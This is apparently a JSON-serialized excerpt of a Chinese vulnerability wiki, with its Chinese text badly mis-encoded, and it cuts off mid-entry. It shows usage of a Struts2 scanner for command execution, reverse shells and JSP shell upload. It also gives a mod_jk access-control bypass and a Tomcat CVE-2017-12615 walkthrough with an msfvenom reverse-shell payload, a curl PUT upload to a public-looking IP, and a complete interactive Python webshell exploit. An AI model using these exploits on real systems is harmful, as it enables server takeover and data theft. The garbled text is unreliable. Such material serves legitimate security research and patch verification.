GETËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ; ÊîØÊåÅ‰ªªÊÑèÂëΩ‰ª§ÊâßË°å [+] S2-005:ÂΩ±ÂìçÁâàÊú¨Struts 2.0.0-2.1.8.1; GETËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ; ÊîØÊåÅËé∑ÂèñWEBË∑ØÂæÑ,‰ªªÊÑèÂëΩ‰ª§ÊâßË°å [+] S2-007:ÂΩ±ÂìçÁâàÊú¨Struts 2.0.0-2.2.3; POSTËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ; ÈªòËÆ§ÂèÇÊï∞‰∏∫:username,password; ÊîØÊåÅ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÂíåÂèçÂºπshell [+] S2-008:ÂΩ±ÂìçÁâàÊú¨Struts 2.1.0-2.3.1; GETËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ; ÊîØÊåÅ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÂíåÂèçÂºπshell [+] S2-009:ÂΩ±ÂìçÁâàÊú¨Struts 2.0.0-2.3.1.1; GETËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ,URLÂêéÈù¢ÈúÄË¶ÅËØ∑Ê±ÇÂèÇÊï∞Âêç; ÈªòËÆ§‰∏∫: key; ÊîØÊåÅ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÂíåÂèçÂºπshell [+] S2-012:ÂΩ±ÂìçÁâàÊú¨Struts Showcase App 2.0.0-2.3.13; GETËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ,ÂèÇÊï∞Áõ¥Êé•Ê∑ªÂä†Âà∞URLÂêéÈù¢; ÈªòËÆ§‰∏∫:name; ÊîØÊåÅ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÂíåÂèçÂºπshell [+] S2-013/S2-014:ÂΩ±ÂìçÁâàÊú¨Struts 2.0.0-2.3.14.1; GETËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ; ÊîØÊåÅËé∑ÂèñWEBË∑ØÂæÑ,‰ªªÊÑèÂëΩ‰ª§ÊâßË°å,ÂèçÂºπshellÂíåÊñá‰ª∂‰∏ä‰º† [+] S2-015:ÂΩ±ÂìçÁâàÊú¨Struts 2.0.0-2.3.14.2; GETËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ; ÊîØÊåÅ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÂíåÂèçÂºπshell [+] S2-016:ÂΩ±ÂìçÁâàÊú¨Struts 2.0.0-2.3.15; GETËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ; ÊîØÊåÅËé∑ÂèñWEBË∑ØÂæÑ,‰ªªÊÑèÂëΩ‰ª§ÊâßË°å,ÂèçÂºπshellÂíåÊñá‰ª∂‰∏ä‰º† [+] S2-019:ÂΩ±ÂìçÁâàÊú¨Struts 2.0.0-2.3.15.1; GETËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ; ÊîØÊåÅËé∑ÂèñWEBË∑ØÂæÑ,‰ªªÊÑèÂëΩ‰ª§ÊâßË°å,ÂèçÂºπshellÂíåÊñá‰ª∂‰∏ä‰º† [+] S2-029:ÂΩ±ÂìçÁâàÊú¨Struts 2.0.0-2.3.24.1(Èô§‰∫Ü2.3.20.3); POSTËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ,ÈúÄË¶ÅÂèÇÊï∞; ÈªòËÆ§ÂèÇÊï∞:message; ÊîØÊåÅ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÂíåÂèçÂºπshell [+] S2-032:ÂΩ±ÂìçÁâàÊú¨Struts 2.3.20-2.3.28(Èô§‰∫Ü2.3.20.3Âíå2.3.24.3); GETËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ; ÊîØÊåÅËé∑ÂèñWEBË∑ØÂæÑ,‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÂíåÂèçÂºπshell [+] S2-033:ÂΩ±ÂìçÁâàÊú¨Struts 2.3.20-2.3.28(Èô§‰∫Ü2.3.20.3Âíå2.3.24.3); GETËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ; ÊîØÊåÅ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÂíåÂèçÂºπshell [+] S2-037:ÂΩ±ÂìçÁâàÊú¨Struts 2.3.20-2.3.28.1; GETËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ; ÊîØÊåÅËé∑ÂèñWEBË∑ØÂæÑ,‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÂíåÂèçÂºπshell [+] S2-045:ÂΩ±ÂìçÁâàÊú¨Struts 2.3.5-2.3.31,2.5-2.5.10; POSTËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ,‰∏çÈúÄË¶ÅÂèÇÊï∞; ÊîØÊåÅËé∑ÂèñWEBË∑ØÂæÑ,‰ªªÊÑèÂëΩ‰ª§ÊâßË°å,ÂèçÂºπshellÂíåÊñá‰ª∂‰∏ä‰º† [+] S2-046:ÂΩ±ÂìçÁâàÊú¨Struts 2.3.5-2.3.31,2.5-2.5.10; POSTËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ,‰∏çÈúÄË¶ÅÂèÇÊï∞; ÊîØÊåÅËé∑ÂèñWEBË∑ØÂæÑ,‰ªªÊÑèÂëΩ‰ª§ÊâßË°å,ÂèçÂºπshellÂíåÊñá‰ª∂‰∏ä‰º† [+] S2-048:ÂΩ±ÂìçÁâàÊú¨Struts 2.3.x with Struts 1 plugin and Struts 1 action; POSTËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ; ÈªòËÆ§ÂèÇÊï∞‰∏∫:username,password; ÊîØÊåÅ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÂíåÂèçÂºπshell [+] S2-053:ÂΩ±ÂìçÁâàÊú¨Struts 2.0.1-2.3.33,2.5-2.5.10; POSTËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ; ÈªòËÆ§ÂèÇÊï∞‰∏∫:username,password; ÊîØÊåÅ‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÂíåÂèçÂºπshell [+] S2-devMode:ÂΩ±ÂìçÁâàÊú¨Struts 2.1.0-2.3.1; GETËØ∑Ê±ÇÂèëÈÄÅÊï∞ÊçÆ; ÊîØÊåÅËé∑ÂèñWEBË∑ØÂæÑ,‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÂíåÂèçÂºπshell Âçï‰∏™URLÊºèÊ¥ûÊ£ÄÊµã: $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] Ê≠£Âú®Êâ´ÊèèURL:http://192.168.100.8:8080/index.action [*] ----------------results------------------ [*] http://192.168.100.8:8080/index.action Â≠òÂú®ÊºèÊ¥û: S2-046 [*] http://192.168.100.8:8080/index.action Â≠òÂú®ÊºèÊ¥û: S2-016 [*] http://192.168.100.8:8080/index.action Â≠òÂú®ÊºèÊ¥û: S2-045 [*] http://192.168.100.8:8080/index.action Â≠òÂú®ÊºèÊ¥û: S2-015 [*] http://192.168.100.8:8080/index.action Â≠òÂú®ÊºèÊ¥û: S2-009 [*] http://192.168.100.8:8080/index.action Â≠òÂú®ÊºèÊ¥û: S2-012 ÊâπÈáèÊºèÊ¥ûÊ£ÄÊµã: $ python3 Struts2Scan.py -f urls.txt POSTÊï∞ÊçÆ: $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -d name=admin&email=admin&age={exp} ÊåáÂÆöÊºèÊ¥ûÂêçÁß∞Âà©Áî®: # ÂëΩ‰ª§ÊâßË°å $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --exec ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy >>>ls -la total 136 drwxr-sr-x 1 root staff 4096 May 5 2017 . drwxrwsr-x 1 root staff 4096 May 5 2017 .. -rw-r----- 1 root root 57092 Apr 13 2017 LICENSE -rw-r----- 1 root root 1723 Apr 13 2017 NOTICE -rw-r----- 1 root root 7064 Apr 13 2017 RELEASE-NOTES -rw-r----- 1 root root 15946 Apr 13 2017 RUNNING.txt drwxr-x--- 1 root root 4096 May 5 2017 bin drwx--S--- 1 root root 4096 Jul 12 14:54 conf drwxr-sr-x 3 root staff 4096 May 5 2017 include drwxr-x--- 2 root root 4096 May 5 2017 lib drwxr-x--- 1 root root 4096 Jul 12 14:54 logs drwxr-sr-x 3 root staff 4096 May 5 2017 native-jni-lib drwxr-x--- 2 root root 4096 May 5 2017 temp drwxr-x--- 1 root root 4096 Jul 12 14:54 webapps drwxr-x--- 1 root root 4096 Jul 12 14:54 work >>> # ÂèçÂºπshll $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --reverse 192.168.100.8:8888 ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [*] ËØ∑Âú®ÂèçÂºπÂú∞ÂùÄÂ§ÑÁõëÂê¨Á´ØÂè£Â¶Ç: nc -lvvp 8080 # Ëé∑ÂèñWEBË∑ØÂæÑ $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --webpath ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [*] /usr/local/tomcat/webapps/ROOT/ # ‰∏ä‰º†shell $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --upfile shell.jsp --uppath /usr/local/tomcat/webapps/ROOT/shell.jsp ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] Êñá‰ª∂‰∏ä‰º†ÊàêÂäü! ÂÖ≥‰∫é Âõ†ÈÉ®ÂàÜÂéüÂõ†ÔºåÂéü‰ΩúËÄÖÂÖ≥Èó≠ÊºèÊ¥ûÂà©Áî®ÔºåÂ¶ÇÈúÄÂà©Áî®ÂèØÂà†Èô§‰ª•‰∏ã‰ª£Á†Å‰ΩøÁî® Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Struts2/Scan/Êâ´ÊèèÂ∑•ÂÖ∑ Exphub-Strtus2.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Struts2/Scan/Êâ´ÊèèÂ∑•ÂÖ∑ Exphub-Strtus2.html","title":"Êâ´ÊèèÂ∑•ÂÖ∑ Exphub-Strtus2","keywords":"","body":"About Apache Struts2 PythonËÑöÊú¨ÊîæÂú®ÂΩìÂâçÁõÆÂΩïÁöÑPOCÊñá‰ª∂Â§π‰∏≠ Vulnerability list struts2-032_cmd.py Struts2 method ‰ªªÊÑè‰ª£Á†ÅÊâßË°åÊºèÊ¥ûGetShellÂà©Áî®ËÑöÊú¨(CVE-2016-3081)struts2-032_poc.py Struts2 method ‰ªªÊÑè‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÊ£ÄÊµãËÑöÊú¨(CVE-2016-3081)struts2-045_cmd.py Struts2 Jakarta Multipart parser Êèí‰ª∂ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÂà©Áî®ËÑöÊú¨1(CVE-2017-5638)[‰ΩøÁî®]struts2-045-2_cmd.py Struts2 Jakarta Multipart parser Êèí‰ª∂ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÂà©Áî®ËÑöÊú¨2(CVE-2017-5638)[‰ΩøÁî®]struts2-052_cmd.py Struts2 REST Êèí‰ª∂ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÂà©Áî®ËÑöÊú¨(CVE-2017-9805)struts2-052_webshell.py Struts2 REST Êèí‰ª∂ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û‰∏ä‰º†WebshellËÑöÊú¨(CVE-2017-9805)struts2-053_cmd.py Struts2 Freemarker Ê†áÁ≠æËøúÁ®ãÊâßË°åÂëΩ‰ª§ÊºèÊ¥ûÂà©Áî®ËÑöÊú¨(CVE-2017-12611)struts2-057_cmd.py Struts2 Namespace ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÂà©Áî®ËÑöÊú¨(CVE-2018-11776) Readme ÈÉ®ÂàÜËÑöÊú¨Êñá‰ª∂‰ΩøÁî®ËØ¥ÊòéÔºåËØ¶ÁªÜ‰ΩøÁî®ÂàÜÊûêËØ∑ÂèÇËÄÉvulnerability-list‰∏≠ÁöÑ[‰ΩøÁî®] VER: ÊºèÊ¥ûÂΩ±ÂìçÁâàÊú¨Ôºå‰∏ÄËà¨ÊÉÖÂÜµ‰∏ã‰∏çÂú®ÂΩ±ÂìçËåÉÂõ¥ÁöÑÁâàÊú¨Ê≤°ÊúâÁõ∏ÂÖ≥ÊºèÊ¥û USE: ËÑöÊú¨Êñá‰ª∂‰ΩøÁî®ËØ¥ÊòéÔºåÂ§ßÈÉ®ÂàÜÂÜôÂú®‰∫ÜËÑöÊú¨ÈáåÔºåÊâßË°åÂç≥ÂèØËßÅ EXP: ËÑöÊú¨Âà©Áî®Á§∫‰æãÔºå‰ª•ÂèäÊâßË°åÊïàÊûú DES: ÈÉ®ÂàÜÁâπÊÆäËÑöÊú¨Êñá‰ª∂ÁöÑÁâπÊÆäÊèèËø∞ ÂèÇËÄÉÊù•Ê∫ê ExpHub Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Mod_jk/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Mod_jk/","title":"Apache Mod_jk","keywords":"","body":"Apache Mod_jk Apache Mod_jk ËÆøÈóÆÊéßÂà∂ÊùÉÈôêÁªïËøá CVE-2018-11759 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Mod_jk/Apache Mod_jk ËÆøÈóÆÊéßÂà∂ÊùÉÈôêÁªïËøá CVE-2018-11759.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Mod_jk/Apache Mod_jk ËÆøÈóÆÊéßÂà∂ÊùÉÈôêÁªïËøá CVE-2018-11759.html","title":"Apache Mod_jk ËÆøÈóÆÊéßÂà∂ÊùÉÈôêÁªïËøá CVE-2018-11759","keywords":"","body":"Apache Mod_jk ËÆøÈóÆÊéßÂà∂ÊùÉÈôêÁªïËøá CVE-2018-11759 ÊºèÊ¥ûÊèèËø∞ Apache Tomcat JKÔºàmod_jkÔºâConnectorÊòØÁæéÂõΩÈòøÂ∏ïÂ•áÔºàApacheÔºâËΩØ‰ª∂Âü∫Èáë‰ºöÁöÑ‰∏ÄÊ¨æ‰∏∫ApacheÊàñIISÊèê‰æõËøûÊé•ÂêéÂè∞TomcatÁöÑÊ®°ÂùóÔºåÁî®‰ª•‰∏∫ApacheÊàñIISÊúçÂä°Âô®Êèê‰æõÂ§ÑÁêÜJSP/ServletÁöÑËÉΩÂäõ„ÄÇ Áî±‰∫éhttpdÂíåTomcatÂú®Ë∑ØÂæÑÂ§ÑÁêÜËßÑËåÉ‰∏äÂ≠òÂú®Â∑ÆÂºÇÔºåÂõ†Ê≠§ÂèØ‰ª•ÁªïËøáApache mod_jk Connector 1.2.0ÁâàÊú¨Âà∞1.2.44ÁâàÊú¨‰∏äÁî±JkMount httpdÊåá‰ª§ÊâÄÂÆö‰πâÁ´ØÁÇπÁöÑËÆøÈóÆÊéßÂà∂ÈôêÂà∂„ÄÇ Â¶ÇÊûú‰∏Ä‰∏™Âè™ÊúâÂè™ËØªÊùÉÈôêÁöÑjkstatusÁöÑÊé•Âè£ÂèØ‰ª•ËÆøÈóÆÁöÑËØùÔºåÈÇ£‰πàÂ∞±ÊúâÂèØËÉΩËÉΩÂ§üÂÖ¨ÂºÄÁî±mod_jkÊ®°ÂùóÁªôAJPÊèê‰æõÊúçÂä°ÁöÑÂÜÖÈÉ®Ë∑ØÁî±„ÄÇ Â¶ÇÊûú‰∏Ä‰∏™ÂÖ∑ÊúâËØªÂÜôÊùÉÈôêÁöÑjkstatusÊé•Âè£ÂèØ‰æõËÆøÈóÆÔºåÊàë‰ª¨Â∞±ËÉΩÈÄöËøá‰øÆÊîπAJPÁöÑÈÖçÁΩÆÊñá‰ª∂‰∏≠Áõ∏ÂÖ≥ÈÖçÁΩÆÊù•Âä´ÊåÅÊàñËÄÖÊà™Êñ≠ÊâÄÊúâÁªèËøámod_jkÁöÑÊµÅÈáèÔºåÂèàÊàñËÄÖËøõË°åÂÜÖÈÉ®ÁöÑÁ´ØÂè£Êâ´Êèè„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Apache Mod_jk Connector 1.2.0 ~ 1.2.44 ÁéØÂ¢ÉÊê≠Âª∫ git clone https://github.com/immunIT/CVE-2018-11759.git docker-conpose up -d ËÆøÈóÆ http://xxx.xxx.xxx.xxx:80 ÊàêÂäüÂç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆ http://xxx.xxx.xxx.xxx/jkstatus ÊòæÁ§∫Êó†ÊùÉÈôêËÆøÈóÆ Forbidden You don't have permission to access /jkstatus on this server. ËÆøÈóÆ http://xxx.xxx.xxx.xxx/jkstatus; Âç≥ÂèØÁªïËøá [!NOTE] Ê≥®ÊÑèÊòØÂú®urlÂêéÈù¢Âä†‰∏ä‰∫Ü‰∏Ä‰∏™; Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Tomcat/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Tomcat/","title":"Apache Tomcat","keywords":"","body":"Apache Tomcat Apache Tomcat ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2021-24122 Apache Tomcat AJP Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û CVE-2020-1938 Apache Tomcat WebSocket ÊãíÁªùÊúçÂä°ÊºèÊ¥û CVE-2020-13935 Apache Tomcat ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2017-12615 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Tomcat/Apache Tomcat ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2017-12615.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Tomcat/Apache Tomcat ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2017-12615.html","title":"Apache Tomcat ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2017-12615","keywords":"","body":"Apache Tomcat ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û CVE-2017-12615 ÊºèÊ¥ûÊèèËø∞ 2017Âπ¥9Êúà19Êó•ÔºåApache TomcatÂÆòÊñπÁ°ÆËÆ§Âπ∂‰øÆÂ§ç‰∫Ü‰∏§‰∏™È´òÂç±ÊºèÊ¥ûÔºåÂÖ∂‰∏≠Â∞±ÊúâËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û(CVE-2017-12615)„ÄÇÂΩì ÂêØÁî®‰∫ÜHTTP PUTËØ∑Ê±ÇÊñπÊ≥ïÔºà‰æãÂ¶ÇÔºåÂ∞Ü readonly ÂàùÂßãÂåñÂèÇÊï∞Áî±ÈªòËÆ§ÂÄºËÆæÁΩÆ‰∏∫ falseÔºâÔºåÊîªÂáªËÄÖÂ∞ÜÊúâÂèØËÉΩÂèØÈÄöËøáÁ≤æÂøÉÊûÑÈÄ†ÁöÑÊîªÂáªËØ∑Ê±ÇÊï∞ÊçÆÂåÖÂêëÊúçÂä°Âô®‰∏ä‰º†ÂåÖÂê´‰ªªÊÑè‰ª£Á†ÅÁöÑ JSP Êñá‰ª∂ÔºåJSPÊñá‰ª∂‰∏≠ÁöÑÊÅ∂ÊÑè‰ª£Á†ÅÂ∞ÜËÉΩË¢´ÊúçÂä°Âô®ÊâßË°å„ÄÇÂØºËá¥ÊúçÂä°Âô®‰∏äÁöÑÊï∞ÊçÆÊ≥ÑÈú≤ÊàñËé∑ÂèñÊúçÂä°Âô®ÊùÉÈôê„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Apache Tomcat 7.0.0 - 7.0.81 ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2017-12615 docker-compose up -d ËÆøÈóÆ http://xxx.xxx.xxx.xxx:8080/ Ê≠£Â∏∏Âç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ ÊºèÊ¥û‰∫ßÁîüÁöÑ‰∏ªË¶ÅÂéüÂõ†Êù•Ëá™‰∫éconf/web.xmlÊñá‰ª∂ÈÖçÁΩÆÈîôËØØ,readonlyÂºÄÂêØ‰∫Üfalse,ÂØºËá¥ÂèØ‰ª•‰ΩøÁî®PUT/DELETEËØ∑Ê±ÇÊñπÊ≥ïÊìç‰ΩúÊñá‰ª∂ msfÁîüÊàê‰∏Ä‰∏™jspÊú®È©¨ msfvenom -p java/jsp_shell_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=9999 -f raw > shell.jsp Âà©Áî®PUTÊñπÊ≥ï‰∏ä‰º†Êú®È©¨ curl -v -X PUT --data-binary @shell.jsp \"http://81.68.139.186:8080/shell.jsp/\" [!NOTE] Ê≥®ÊÑè http://xxx.xxx.xxx.xxx:8080/shell.jsp/‰∏≠ÁöÑÊúÄÂêé‰∏Ä‰∏™\"/\"Â≠óÁ¨¶ÂæàÈáçË¶Å ÂèëÁé∞ÊàêÂäü‰∏ä‰º†Êú®È©¨Êñá‰ª∂ ËÆøÈóÆÊñá‰ª∂Âç≥ÂèØÂèçÂºπ‰∏Ä‰∏™shell ‰πüÂèØ‰ª•‰ΩøÁî®DELETEËØ∑Ê±ÇÊñπÊ≥ïÂà†Èô§Êñá‰ª∂ ÊºèÊ¥ûÂà©Áî®POC [!NOTE] ‰ª£Á†ÅÂè™Áî®‰∫éÊ£ÄÊµãÊºèÊ¥ûÔºåÂèçÂºπshellÂèÇÁÖß‰∏äÊñπ #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import hashlib import sys import requests import random import re def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Apache Tomcat 7.0.0 - 7.0.81 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 CVE-2017-12615.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8080 \\033[0m') print('+ \\033[36mCmd >>> shell \\033[0m') print('+ \\033[36mCmd >>> exit(ÈÄÄÂá∫‰∫§‰∫íÂπ∂Âà†Èô§webshell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): md5_filename = str(random.randint(1,999)).encode(\"utf-8\") file_name = hashlib.md5(md5_filename).hexdigest() vuln_put_url = target_url + \"/\" + file_name + \".jsp/\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } data = \"\"\" \"\"\" try: response = requests.request(\"PUT\", url=vuln_put_url, data=data, headers=headers, timeout=30) if response.status_code == 201 or response.status_code == 201: print(\"\\033[32m[o] Âê´ÊúâCVE-2017-12615ÊºèÊ¥ûÔºåÊàêÂäü‰∏ä‰º†shellÔºåÊñá‰ª∂Âêç‰∏∫{}.jsp,ÂìçÂ∫î‰∏∫{}\\033[0m\".format(file_name,response.status_code)) return file_name else: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥•,PUTÊñπÊ≥ïÂÖ≥Èó≠ \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥•,PUTÊñπÊ≥ïÂÖ≥Èó≠ \\033[0m\") sys.exit(0) def POC_2(target_url, file_name, cmd): vuln_cmd_url = target_url + \"/\" + file_name + \".jsp?\" + \"pwd=peiqi&cmd=\" + cmd headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=vuln_cmd_url, headers=headers,timeout=30) if response.status_code == 200: print(\"\\033[32m[o] ÊàêÂäüÊâßË°åÂëΩ‰ª§,ÂìçÂ∫î‰∏∫:\\n\\033[0m\",response.text) else: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥•,ÂëΩ‰ª§Êó†Ê≥ïÊâßË°å \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥•,ÂëΩ‰ª§Êó†Ê≥ïÊâßË°å \\033[0m\") sys.exit(0) def POC_3(target_url, file_name): vuln_delect_url = target_url + \"/\" + file_name + \".jsp/\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.request(\"DELETE\", url=vuln_delect_url, headers=headers, timeout=30) if response.status_code == 200 or 201: print(\"\\033[32m[o] ÊàêÂäüÂà†Èô§shellÔºåÊñá‰ª∂Âêç‰∏∫{}.jsp,ÂìçÂ∫î‰∏∫{}\\033[0m\".format(file_name,response.status_code)) return file_name else: print(\"\\033[31m[x] Âà†Èô§Â§±Ë¥• \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] Âà†Èô§Â§±Ë¥• \\033[0m\") sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = POC_1(target_url) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": POC_3(target_url, file_name) sys.exit(0) else: POC_2(target_url, file_name, cmd) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Tomcat/Apache Tomcat AJP Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û CVE-2020-1938.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Tomcat/Apache Tomcat AJP Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û CVE-2020-1938.html","title":"Apache Tomcat AJP Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û CVE-2020-1938","keywords":"","body":"Aapache Tomcat AJP Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û CVE-2020-1938 ÊºèÊ¥ûÊèèËø∞ Java ÊòØÁõÆÂâç Web 